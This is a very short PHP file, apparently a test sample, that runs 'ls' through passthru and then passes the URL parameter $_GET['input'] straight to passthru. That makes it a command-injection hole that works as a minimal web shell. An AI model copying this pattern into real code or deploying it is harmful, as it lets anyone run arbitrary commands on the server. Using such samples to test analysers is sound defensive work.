<?php
$output = passthru("ls"); //no error
echo $output;
$output = passthru($_GET['input']);
echo $output;
